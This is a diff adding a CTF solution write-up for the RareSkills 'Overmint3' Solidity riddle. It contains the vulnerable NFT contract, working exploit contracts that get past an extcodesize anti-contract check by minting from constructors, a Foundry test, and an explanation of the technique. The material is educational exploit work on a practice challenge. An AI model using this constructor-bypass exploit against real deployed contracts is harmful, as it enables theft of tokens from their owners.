@@ -79,12 +79,100 @@ Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/Overmin
 ### Contracts
 - `src/Week10-11/Overmint3.sol`
 ```
+contract Overmint3 is ERC721 {
+    using Address for address;
+
+    mapping(address => uint256) public amountMinted;
+    uint256 public totalSupply;
+
+    constructor() ERC721("Overmint3", "AT") {}
+
+    function mint() external {
+        require(!isContract(msg.sender), "no contracts");
+        require(amountMinted[msg.sender] < 1, "only 1 NFT");
+        totalSupply++;
+        _safeMint(msg.sender, totalSupply);
+        amountMinted[msg.sender]++;
+    }
+
+    //`isContract()` has been removed from OpenZeppelin's `Address` library in V5
+    function isContract(address _addr) public view returns (bool) {
+        uint256 size;
+        assembly {
+            size := extcodesize(_addr)
+        }
+        return size > 0;
+    }
+}
+
+contract Exploit {
+    Overmint3 public overmint3Contract;
+    address public attackerWallet;
+
+    constructor(Overmint3 _overmint3Contract, address _attackerWallet) {
+        overmint3Contract = _overmint3Contract;
+        attackerWallet = _attackerWallet;
+        new ExploitMedium(overmint3Contract, this);
+        new ExploitMedium(overmint3Contract, this);
+        new ExploitMedium(overmint3Contract, this);
+        new ExploitMedium(overmint3Contract, this);
+        new ExploitMedium(overmint3Contract, this);
+    }
+
+    function retrieve() public payable {
+        uint256 balance = overmint3Contract.totalSupply();
+        for (uint256 i = 1; i <= balance; i++) {
+            overmint3Contract.transferFrom(address(this), attackerWallet, i);
+        }
+    }
+}
+
+contract ExploitMedium {
+    Overmint3 public overmint3Contract;
+    Exploit public exploitContract;
+
+    constructor(Overmint3 _overmint3Contract, Exploit _exploitContract) {
+        overmint3Contract = _overmint3Contract;
+        exploitContract = _exploitContract;
+        overmint3Contract.mint();
+        uint256 tokenId = overmint3Contract.totalSupply();
+        overmint3Contract.transferFrom(address(this), address(exploitContract), tokenId);
+    }
+}
 ```
 - `test/Week10-11/Overmint3.t.sol`
 ```
+contract Overmint3Test is Test {
+    Overmint3 overmint3Contract;
+    address attackerWallet;
+    Exploit exploitContract;
+
+    function setUp() public {
+        overmint3Contract = new Overmint3();
+        attackerWallet = address(0xbad);
+        exploitContract = new Exploit(overmint3Contract, attackerWallet);
+    }
+
+    function testExploit() public {
+        vm.startPrank(attackerWallet);
+        exploitContract.retrieve();
+        vm.stopPrank();
+        _checkSolved();
+    }
+
+    function _checkSolved() internal {
+        assertEq(overmint3Contract.balanceOf(attackerWallet), 5);
+        assertTrue(vm.getNonce(address(attackerWallet)) <= 1, "must exploit in one transaction");
+    }
+}
 ```
 
 ### Exploit
+The exploit requires understanding that when a function call is made from the constructor of a contract, `extcodesize` of the msg.sender will be `0` since the contract code is only stored at the end of the constructor execution. So this will bypass the `isContract` check in the `mint` function when its called from another contract's constructor.
+
+One might be tempted to use the `onERC721Received` hook in `IERC721Receiver` to try to reenter the mint function to continuously mint NFTs in a single call, but this attack vector will fail. The reason is because if our attack was initiated in the constructor, then there will be no `onERC721Received` hook in the attacking contract available to be called yet since the constructor has not competed its execution. This would only allow 1 NFT to be minted to the attacking contract.
+
+Instead, we could deploy 5 secondary attack contracts that solely exists to call `mint` once in each of their constructors, and then transfer the minted NFT to the primary attacking contract (or to `attackerWallet` for the matter). The primary attacking contract only needs to create 5 instances of the secondary attaking contract in its constructor, and these secondary attacking contracts will then mint and transfer an NFT to the primary contract within their constructor. At the end of the contract deployments, `attackerWallet` just has to call `retrieve` on `Exploit` to transfer out all minted NFTs.
 
 ## RareSkills Solidity Riddles: Democracy
 Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/Democracy.sol
